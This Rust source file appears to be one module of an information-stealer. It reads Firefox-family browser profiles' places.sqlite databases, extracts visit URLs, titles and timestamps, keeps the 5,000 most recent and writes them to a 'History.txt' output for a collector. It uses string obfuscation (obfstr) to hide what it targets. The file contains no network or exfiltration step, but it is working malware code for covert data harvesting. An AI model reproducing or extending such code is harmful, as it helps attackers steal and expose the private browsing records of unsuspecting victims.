use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{
    ExtractExt, History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const MOZ_PLACES_URL: usize = 1;
const MOZ_PLACES_TITLE: usize = 2;
const MOZ_PLACES_LAST_VISIT_DATE: usize = 8;

#[derive(new)]
pub(super) struct HistoryTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask<'_> {
    parent_name!("History.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("places.sqlite"),
            s!("moz_places"),
            History::make_extractor((MOZ_PLACES_URL, MOZ_PLACES_TITLE, MOZ_PLACES_LAST_VISIT_DATE)),
        ) else {
            return;
        };

        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(5000);

        collector.get_browser().increase_history_by(history.len());
        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
    }
}
